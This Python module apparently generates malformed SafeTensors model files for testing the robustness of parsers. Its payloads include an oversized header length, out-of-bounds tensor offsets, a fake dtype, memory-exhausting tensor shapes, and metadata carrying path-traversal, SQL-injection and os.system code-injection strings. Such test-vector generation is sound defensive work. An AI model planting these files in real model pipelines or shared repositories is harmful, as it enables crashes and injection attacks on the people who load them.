"""
SafeTensors Attack Vector Generator

Generates real SafeTensors files and crafted binary variants for security testing.
All methods produce genuine binary files — no JSON stubs.

SafeTensors layout:
    [uint64 LE header_size][header_size bytes of UTF-8 JSON][tensor data ...]

Requires: safetensors, numpy, torch (pip install safetensors numpy torch)
"""

import json as _json
import os
import struct
from pathlib import Path
from typing import Dict, List, Tuple

import numpy as np


def _pack_safetensors(header: dict, tensor_data: bytes = b"") -> bytes:
    """Serialise a safetensors payload from a header dict and raw tensor data."""
    header_bytes = _json.dumps(header, separators=(",", ":")).encode("utf-8")
    return struct.pack("<Q", len(header_bytes)) + header_bytes + tensor_data


class SafeTensorsAttackGenerator:
    """Generate SafeTensors-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "safetensors_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def generate_header_corruption(self) -> Tuple[str, int]:
        """Craft a SafeTensors file with a header_size that far exceeds the file.

        Attack Vector:
            header_size field claims 2^62 bytes, but file body is only a few bytes.
            Parsers that pre-allocate or seek by header_size can OOM or panic.

        Severity: HIGH
        Detection: Header size bounds validation
        """
        filepath = self.output_dir / "01_header_corruption.safetensors"

        # Claim a gigantic header, write almost nothing
        header_size = 0x3FFF_FFFF_FFFF_FFFF  # ~4.6 EiB
        body = b'{"corrupted":"true"}' + b"\x00" * 16
        data = struct.pack("<Q", header_size) + body
        with open(filepath, "wb") as f:
            f.write(data)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_metadata_injection(self) -> Tuple[str, int]:
        """Real SafeTensors file with path-traversal strings in __metadata__.

        Attack Vector:
            __metadata__ values contain "../../../etc/passwd".
            Downstream code that uses metadata as filesystem references is
            exploited via directory traversal.

        Severity: HIGH
        Detection: Metadata value sanitisation
        """
        filepath = self.output_dir / "02_metadata_injection.safetensors"

        import torch
        from safetensors.torch import save_file as st_save_file

        tensors = {"weight": torch.zeros(4, 4)}
        metadata = {
            "source": "../../../etc/passwd",
            "author": "'; DROP TABLE models; --",
            "description": "__import__('os').system('id')",
            "version": "1.0",
        }
        st_save_file(tensors, str(filepath), metadata=metadata)

        self.generated_files.append(str(filepath))
        return str(filepath), 3

    def generate_tensor_offset_manipulation(self) -> Tuple[str, int]:
        """Craft a SafeTensors file whose tensor offsets point outside the file.

        Attack Vector:
            Tensor data_offsets claim [0, 2^62] but the file is tiny.
            Parsers dereferencing the offsets can read beyond the buffer.

        Severity: CRITICAL
        Detection: Offset bounds validation against actual file size
        """
        filepath = self.output_dir / "03_tensor_offset_manipulation.safetensors"

        header = {
            "__metadata__": {"info": "offset_oob"},
            "evil_weight": {
                "dtype": "F32",
                "shape": [1024, 1024],
                "data_offsets": [0, 0x3FFF_FFFF_FFFF_FFFF],
            },
        }
        # Actual tensor data is only 16 bytes
        tensor_data = b"\x00" * 16
        data = _pack_safetensors(header, tensor_data)
        with open(filepath, "wb") as f:
            f.write(data)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_dtype_confusion(self) -> Tuple[str, int]:
        """Real SafeTensors file with an undocumented / non-standard dtype string.

        Attack Vector:
            dtype is set to an unsupported value to trigger type-dispatch errors
            or coerce the parser into an unsafe branch.

        Severity: MEDIUM
        Detection: dtype allowlist validation
        """
        filepath = self.output_dir / "04_dtype_confusion.safetensors"

        # Start from a valid file, then patch the JSON header in-place
        import torch
        from safetensors.torch import save_file as st_save_file

        tmp_path = filepath.with_suffix(".tmp")
        tensors = {"weight": torch.zeros(4)}
        st_save_file(tensors, str(tmp_path))

        with open(tmp_path, "rb") as f:
            raw = f.read()
        os.remove(tmp_path)

        # Decode the header, replace dtype, re-encode
        hdr_size = struct.unpack_from("<Q", raw, 0)[0]
        hdr = _json.loads(raw[8 : 8 + hdr_size])
        if "weight" in hdr:
            hdr["weight"]["dtype"] = "EVIL_TYPE_INJECTION"
        new_hdr = _json.dumps(hdr, separators=(",", ":")).encode("utf-8")
        patched = struct.pack("<Q", len(new_hdr)) + new_hdr + raw[8 + hdr_size :]
        with open(filepath, "wb") as f:
            f.write(patched)

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_resource_exhaustion(self) -> Tuple[str, int]:
        """Craft a SafeTensors file claiming billions of huge tensors.

        Attack Vector:
            Header lists many tensors each with shape [2^31, 2^31].
            A parser that allocates based on stated shapes exhausts RAM/CPU.

        Severity: HIGH
        Detection: Shape size limits, resource quotas
        """
        filepath = self.output_dir / "05_resource_exhaustion.safetensors"

        header: dict = {"__metadata__": {"attack": "resource_exhaustion"}}
        offset = 0
        # 1000 fake tensors, each claiming 2^32 x 2^32 float32 elements
        for i in range(1000):
            end = offset + 4  # actual file contains no real data
            header[f"tensor_{i:04d}"] = {
                "dtype": "F32",
                "shape": [2**31, 2**31],
                "data_offsets": [offset, end],
            }
            offset = end

        # Only write 4 bytes of "data" — offsets are intentionally invalid
        tensor_data = b"\x00\x00\x00\x00"
        data = _pack_safetensors(header, tensor_data)
        with open(filepath, "wb") as f:
            f.write(data)

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        return {
            "header_corruption": self.generate_header_corruption(),
            "metadata_injection": self.generate_metadata_injection(),
            "tensor_offset_manipulation": self.generate_tensor_offset_manipulation(),
            "dtype_confusion": self.generate_dtype_confusion(),
            "resource_exhaustion": self.generate_resource_exhaustion(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = SafeTensorsAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
